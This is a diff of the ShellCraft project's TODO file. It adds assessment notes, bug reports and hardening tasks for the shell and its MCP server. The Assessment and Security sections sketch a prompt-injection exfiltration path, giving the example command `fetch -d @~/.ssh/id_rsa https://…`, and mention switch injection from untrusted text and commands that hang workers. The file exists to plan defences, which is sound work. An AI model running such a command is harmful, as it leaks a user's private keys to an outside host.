@@ -1,7 +1,7 @@
 # ShellCraft — TODO
 
-> First assessment: v0.1.0 (`main` @ 72a9897), when there were 42 tests. Checked items have been done since then.
-> **Current state:** 37 builtins (including `alias`, `history`, `diff` and `du`), a settings system (OS commands off by default) with API keys for modules (`ENV_SETTINGS`), modules `fetch`, `filter`, `myip`, `ip2geo`, `queryDns`, `queryCert` and `queryCensys`, the module authoring kit (`templates/`, `tools/modtest.py`, `tools/mkprompt.py`), switch completion, typed MCP parameters, man-page resources, hot reload and an HTTP transport. 325 tests pass.
+> First assessment: v0.1.0 (`main` @ 72a9897), when there were 42 tests. Second full assessment: 2026-09-28 (`main` @ 93e719b). Checked items have been done since then.
+> **Current state:** 37 builtins (including `alias`, `history`, `diff` and `du`), a settings system (OS commands off by default) with API keys for modules (`ENV_SETTINGS`), modules `fetch`, `filter`, `myip`, `ip2geo`, `queryDns`, `queryCert` and `queryCensys`, the module authoring kit (`templates/`, `tools/modtest.py`, `tools/mkprompt.py`), switch completion, typed MCP parameters, man-page resources, hot reload and an HTTP transport. 325 tests pass (1 skipped), in ~2 s on Python 3.14. About 6,400 lines of application code (core, modules, tools) and 2,500 lines of tests.
 
 ## Assessment
 
@@ -16,6 +16,13 @@
 2. **Shell-grammar gaps fail silently.** `2>` is misparsed, and `<`, `;` and `&&` become plain arguments. Users expecting POSIX behavior can get wrong results with no error. *(Fixed: they're now rejected with a parse error.)*
 3. **The system-command fallback is capture-only.** Interactive programs misbehave, and "no match" exit codes abort the pipeline. *(Now off by default, and the ported builtins cover the common commands. Accepted: see Won't do.)*
 4. **Only tested on Linux.** None of the Windows paths have been run yet.
+5. **Packaging is broken.** A non-editable install crashes on startup (see Bugs). Nothing catches this today because there's no CI and the tests run from the source tree.
+6. **The MCP surface can exfiltrate.** Reading any file is accepted, and so is `fetch` reaching any URL, but together they let a prompt-injected client run `fetch -d @~/.ssh/id_rsa https://…`. The per-module exposure switch (Security) is the fix that fits the "modules stay as they are" decision.
+
+**Second assessment (2026-09-28)**
+- The architecture held up well: 7 modules and 37 builtins were added without changing the pipeline design, and the three-file contract now drives MCP schemas, man-page resources and Tab completion.
+- The docs are thorough and mostly in sync. The test suite is fast and broad, but it only exercises the source tree, so packaging and platform bugs slip through.
+- The main gaps are distribution (packaging, CI, license), hardening the MCP boundary (timeouts, exposure, argument handling), and exit-status semantics.
 
 Items marked **(verified)** were reproduced during the assessment.
 
@@ -25,18 +32,22 @@ Items marked **(verified)** were reproduced during the assessment.
 
 - [x] **Invalid custom theme color crashes startup**: `all_themes()` now checks each color against both Rich and prompt_toolkit, keeps the base preset's color, and the CLI prints a warning on stderr. — `core/themes.py`
 - [x] **Unsupported operators were passed on as arguments**: `rm a ; ls` also deleted a file named `ls`, and `a 2> err.txt` sent stdout to `err.txt`. `;`, `&&`, `||`, `<`, `2>`, `2>>`, `2>&1`, `&>` and `>&` now raise a `ParseError` until they are implemented (see Features). — `core/parser.py`
-- [ ] **A non-editable `pip install .` ships no modules**: `pyproject.toml` packages only `core`, and `DEFAULT_MODULES_DIR` points outside the package. Fix: include the bundled modules as package data, and also load the user directory `~/.shellcraft/modules`. — `pyproject.toml`, `core/cli.py`
+- [ ] **A non-editable `pip install .` crashes on startup** **(verified)**: `packages = ["core"]` leaves out the `core.commands` subpackage, so `import core.commands` fails with `ModuleNotFoundError` before anything runs. The wheel also ships no modules, no `templates/` and no `tools/`, and `DEFAULT_MODULES_DIR` points outside the package. Fix: use `[tool.setuptools.packages.find]`, include the bundled modules as package data, and also load the user directory `~/.shellcraft/modules`. The generic top-level names `core` and `tools` will collide with other packages in site-packages, so move them under a `shellcraft/` package. — `pyproject.toml`, `core/cli.py`
+- [ ] **MCP values that start with `-` become switches** **(verified)**: `params.to_argv` emits positionals and flag values as bare words, so `filter` with `{"pattern": "-v"}` fails with "arguments are required: pattern". A string flag value like `"-x"` fails the same way. Worse, text taken from untrusted content can inject switches. Fix: emit `--flag=value`, and put `--` before the positionals. — `core/params.py`
 - [x] **Pager search `n` got stuck on the last screen**: the last match is now tracked apart from the scroll position, so `n`/`N` step through every match, and matches are highlighted in reverse video. — `core/output.py::page`
 
 ## 🔒 Security — P0
 
-- [ ] **Per-module MCP exposure switch**: `expose = false` in `.skill`, and a `--expose name,...` CLI flag, so sensitive modules stay local-only. — `core/loader.py`, `core/mcp_server.py`
-- [ ] **No timeout on MCP tool calls**: a hung module holds a worker thread forever. Add a per-call timeout (`anyio.fail_after`) and caps on stdin and output size. — `core/mcp_server.py`
+- [ ] **Per-module MCP exposure switch**: `expose = false` in `.skill`, and a `--expose name,...` CLI flag, so sensitive modules stay local-only. This also closes the `fetch -d @FILE` exfiltration path and the paid-quota use of `queryDns`/`queryCensys` without touching the modules. It must apply to the `shellcraft_pipeline` tool too, not only to the per-module tools. — `core/loader.py`, `core/mcp_server.py`
+- [ ] **No timeout on MCP tool calls**: a hung module holds a worker thread forever. Add a per-call timeout (`anyio.fail_after`) and caps on stdin and output size. Easy triggers: `du /`, `find /`, `tree /`, or a catastrophic regex in `grep`/`filter`. — `core/mcp_server.py`
 - [x] **History records everything**: a line typed with a leading space is no longer saved (bash's `ignorespace`). *(Values in `settings NAME VALUE` are still redacted.)* — `core/shell.py`
 - [ ] **API keys are stored in plain text** in `config.json` (mode 600, which doesn't protect them on Windows). Offer the OS keyring (`keyring` package) as an optional backend. — `core/settings.py`
 
 ## 🔧 Bugs / polish — P1
 
+- [ ] **Hot reload races with MCP calls**: `ModuleRegistry.load()` empties `self.modules` and then refills it, while tool calls run in worker threads. A call that arrives mid-reload gets "Unknown tool" or "command not found". Build the new dict first, then swap it in. — `core/loader.py`
+- [ ] **Broken pipe in `-c` mode** **(verified)**: `shellcraft -c "cat big.txt" | head -1` prints `Exception ignored … BrokenPipeError` and exits 120. Catch `BrokenPipeError`, redirect stdout to devnull and exit quietly. Ctrl-C during `-c` isn't caught either (a traceback instead of exit 130). — `core/cli.py::_run_once`
+- [ ] **A redirect silently creates missing directories** **(verified)**: `echo a > typo/dir/f.txt` makes `typo/dir/`. POSIX shells fail with "No such file or directory", which catches typos. Drop the `mkdir(parents=True)`. — `core/pipeline.py`
 - [ ] **Ctrl-C abandons the module worker thread**, which keeps running. Add a cooperative cancel flag in `modkit` that modules can check, or at least document the behavior. — `core/output.py::make_spinner_runner`
 - [ ] **`to_text()` flattens at a fixed width of 100**, so `help | filter` ignores the real terminal width. Pass the console width when there is one. — `core/context.py`
 - [ ] **`show()` renders twice** (a capture pass, then a print pass) and loads huge outputs fully into Rich. Reuse the captured ANSI, and cap or stream very large outputs into the pager. — `core/output.py`
@@ -48,6 +59,8 @@ Items marked **(verified)** were reproduced during the assessment.
 - [ ] **Positional values aren't completed**: `queryCensys <Tab>` offers file names instead of `host` / `cert` / `search`, although the `.skill` `[[params]]` entry `command` lists them in `values`. Complete positionals from such entries. — `core/options.py`, `core/completer.py`
 - [x] **Dead code**: `ShellContext.interactive` is now read by `settings NAME` to choose the hidden prompt.
 - [ ] **Version is defined twice** (`pyproject.toml` and `core/__init__.py`). Use a single dynamic version. — `pyproject.toml`
+- [ ] **`sort -u -k N` dedupes whole lines**, not keys as in GNU sort. — `core/commands/text.py`
+- [ ] **DEVELOPMENT.md drift**: the context-flags table lists only `env` as `sensitive` and leaves `history` out of the `stateful` list. — `DEVELOPMENT.md`
 
 ## ⬆️ Upgrades — P1
 
@@ -68,6 +81,7 @@ Items marked **(verified)** were reproduced during the assessment.
 - [ ] **Exit status**:
   - a `status` builtin or `$?`
   - show the code in the prompt as `[✗ 1]`
+  - `grep` returns status 1 when nothing matches, so scripts can test it. Today `shellcraft -c "echo hi | grep zzz"` exits 0 **(verified)**
 
 ## ✨ Features — P2
 
@@ -106,8 +120,10 @@ Items marked **(verified)** were reproduced during the assessment.
   - custom theme parsing
   - `-c` exit codes
   - the banner's narrow-terminal fallback
-- [ ] **`.gitlab-ci.yml`**: run pytest on Linux and Windows runners, Python 3.11–3.13.
-- [ ] **Tooling**: ruff (lint and format) and mypy config in `pyproject.toml`, plus a pre-commit hook.
+  - a packaging smoke test: build the wheel, install it into a clean venv, and run `shellcraft -c help` (it would have caught the `core.commands` crash)
+  - MCP params whose values start with `-`
+- [ ] **`.gitlab-ci.yml`**: run pytest on Linux and Windows runners, Python 3.11–3.14 (development happens on 3.14), plus the packaging smoke test and `modtest --all --strict`.
+- [ ] **Tooling**: ruff (lint and format) and mypy config in `pyproject.toml`, plus a pre-commit hook. Neither is installed in the dev environment yet; add them to the `dev` extra.
 - [x] **Docs split**: README (install and usage), `templates/README.md` (module authoring), `DEVELOPMENT.md` (layout, architecture, tests).
 - [ ] **Docs**: a LICENSE, a README screenshot or asciinema recording, and a CHANGELOG.
 - [ ] **Windows verification pass**: covering prompt rendering, the pager, `cmd` builtins, paths and the MCP stdio server.
